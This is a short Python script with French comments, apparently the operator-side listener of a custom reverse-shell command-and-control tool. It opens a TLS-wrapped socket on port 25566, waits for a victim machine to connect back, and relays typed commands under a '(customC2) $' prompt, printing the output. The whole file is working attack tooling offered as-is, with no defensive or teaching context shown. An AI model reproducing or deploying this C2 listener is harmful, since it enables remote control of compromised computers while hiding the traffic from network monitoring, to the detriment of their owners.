# client_revershell
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

import socket
import ssl

HOST = '0.0.0.0'
PORT = 25566

# Créer une socket TCP/IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)

# Envelopper la socket dans un contexte SSL
context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="./chiffrement/python_ssl.pem",
                        keyfile="./chiffrement/python_ssl_priv.key")

while True:
    print(f"[*] Listening to {HOST}:{PORT}")
    conn, addr = sock.accept()

    # Envelopper la connexion entrante dans un contexte SSL
    connssl = context.wrap_socket(conn, server_side=True)
    print(connssl.version())

    try:
        print(f"[+] Client connected : {addr}")
        while True:
            command = input("(customC2) $ ")
            if command == "q" or command == "quit" or command == "exit":
                connssl.sendall(command.encode())
                reply = connssl.recv(1024)
                print('quitting console')
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
                exit(0)
            connssl.sendall(command.encode())
            reply = connssl.recv(1024)
            if not reply:
                break
            print(reply)
    finally:
        connssl.shutdown(socket.SHUT_RDWR)
        connssl.close()